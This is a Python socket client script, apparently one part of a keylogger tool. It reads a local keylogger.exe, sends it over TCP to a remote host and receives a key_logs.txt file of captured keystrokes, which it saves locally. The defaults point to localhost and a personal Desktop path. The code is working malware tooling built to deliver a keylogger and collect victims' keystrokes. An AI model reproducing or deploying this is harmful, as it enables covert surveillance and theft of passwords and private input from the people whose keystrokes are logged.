import os
import socket

def run_client(host, port, file_path):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    # Read the keylogger script
    with open(file_path, "rb") as f:
        file_data = f.read()

    # Send the file size first
    file_size = len(file_data)
    client_socket.sendall(file_size.to_bytes(8, byteorder='big'))

    # Send the file data in chunks
    sent_bytes = 0
    while sent_bytes < file_size:
        chunk = file_data[sent_bytes:sent_bytes+4096]
        client_socket.sendall(chunk)
        sent_bytes += len(chunk)

    # Receive the key_logs.txt file size
    keylogs_size_bytes = client_socket.recv(8)
    keylogs_size = int.from_bytes(keylogs_size_bytes, byteorder='big')

    # Receive the key_logs.txt file data in chunks
    received_data = b""
    while len(received_data) < keylogs_size:
        chunk = client_socket.recv(min(4096, keylogs_size - len(received_data)))
        if not chunk:
            break
        received_data += chunk

    # Write the received key_logs.txt file
    with open("key_logs.txt", "wb") as f:
        f.write(received_data)

    client_socket.close()

if __name__ == "__main__":
    HOST = "localhost"
    PORT = 12345
    FILE_PATH = "C:\\Users\\profe\\Desktop\\NZ\\three\\client\\keylogger.exe"
    run_client(HOST, PORT, FILE_PATH)
